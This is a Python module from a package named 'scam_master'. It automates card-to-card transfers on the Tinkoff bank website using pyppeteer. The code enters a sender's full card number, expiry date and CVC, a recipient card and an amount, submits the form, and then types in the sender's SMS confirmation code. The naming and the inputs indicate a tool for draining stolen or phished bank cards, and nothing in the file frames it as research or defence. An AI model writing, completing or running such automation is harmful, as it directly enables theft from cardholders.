import asyncio
from pyppeteer.page import Page as PyppPage
from loguru import logger

from scam_master.banks.errors import UNKNOWN_TRANSFER_STATUS
from scam_master.banks.interface import IBankTransfer
from scam_master.services.models.transactions import Card


class TinkoffTransfer(IBankTransfer):
    @staticmethod
    async def fill_out_transfer_form(page: PyppPage, url: str, sender_card: Card, recipient_card_number: str, amount: int) -> None:
        try:    
            await page.goto(url)
            
            await page.waitForXPath("(//input[@name='cardNumber'])[1]")
            input_element = await page.xpath("(//input[@name='cardNumber'])[1]")
            await input_element[0].type(sender_card.card_number)

            await asyncio.sleep(2)

            await page.waitForSelector("input[name='date']")
            await page.type("input[name='date']", sender_card.expiration_date)
            
            await asyncio.sleep(2)

            for action in TinkoffTransfer._fill_cvc(sender_card.cvc):
                await page.waitForXPath(action)
                action_element = await page.xpath(action)
                await action_element[0].click()

            input_element = await page.xpath("(//input[@name='cardNumber'])[2]")
            await input_element[0].type(recipient_card_number)

            await asyncio.sleep(2)
            
            transfer_amount = f"{(amount / 100):.2f}"
            await page.type("input[name='moneyAmount']", transfer_amount)
            
            await asyncio.sleep(2)

            await page.waitForSelector('span[data-qa-file="CommissionDescription"]')
            
            await asyncio.sleep(2)
            
            await page.click('button[data-qa-file="SubmitButton"]')
            
            await asyncio.sleep(2)
        
        except Exception as e:
            logger.error(e)
            raise UNKNOWN_TRANSFER_STATUS

    @staticmethod
    async def confirm_transfer(page: PyppPage, sms_code: str) -> None:
        try:
            await page.waitForSelector('input[name="password"]')
            await page.type('input[name="password"]', sms_code)
            
            text = await TinkoffTransfer._check_transfer_status(page)
            logger.info(text)
        
        except Exception as e:
            logger.error(e)
            raise UNKNOWN_TRANSFER_STATUS
    
    @staticmethod
    async def _check_transfer_status(page: PyppPage) -> str:
        try:
            await page.waitForXPath('(//*[@data-qa-file="UIAlertError"] | //div[@data-qa-file="PageTitleContainer"])')
            elements = await page.xpath('(//span[@data-qa-file="UIAlertError" and contains(@class, "ui-alert-error__message")] | //div[@data-qa-file="PageTitleContainer"])')
            
            if elements:
                extracted_text = await page.evaluate('(e) => e.innerText', elements[0])
                return extracted_text
        
        except Exception as e:
            logger.error(e)
            raise UNKNOWN_TRANSFER_STATUS

    @staticmethod
    def _fill_cvc(cvc: str) -> list[str]:
        return [f"//span[@data-value='{char}']" for char in cvc]
